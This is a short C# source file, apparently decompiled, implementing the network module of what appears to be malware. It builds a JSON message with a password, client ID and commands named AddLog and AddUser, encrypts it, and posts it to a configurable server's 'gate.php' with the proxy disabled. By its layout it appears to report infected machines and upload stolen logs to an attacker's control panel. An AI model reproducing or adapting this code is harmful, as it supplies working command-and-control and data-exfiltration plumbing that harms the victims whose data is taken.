using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using JSONSerializer;
using Microsoft.VisualBasic.CompilerServices;

internal class Connection
{
	public enum CommandType
	{
		AddLog,
		AddUser
	}

	public static string Send(Types.JSONObject data)
	{
		string empty = string.Empty;
		try
		{
			string text = string.Empty;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Settings.URL + "gate.php");
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.Method = "POST";
			httpWebRequest2.KeepAlive = true;
			httpWebRequest2.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
			httpWebRequest2.Proxy = null;
			httpWebRequest2 = null;
			using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream(), Encoding.UTF8))
			{
				streamWriter.Write(Cryptography.RijndaelEncrypt(Serializer.Serialize(data), Settings.Encryption));
			}
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				if (httpWebResponse.StatusCode == HttpStatusCode.OK)
				{
					using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
					text = streamReader.ReadToEnd();
				}
			}
			return Cryptography.Base64Decode(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return empty;
	}

	public static string SendCommand(CommandType command, object args = "")
	{
		Types.JSONObject jSONObject = new Types.JSONObject();
		Types.JSONObject jSONObject2 = jSONObject;
		jSONObject2.Add("pw", Settings.Password);
		jSONObject2.Add("id", Settings.ID);
		jSONObject2.Add("cmd", (int)command);
		jSONObject2.Add("args", RuntimeHelpers.GetObjectValue(args));
		jSONObject2 = null;
		return Send(jSONObject);
	}
}
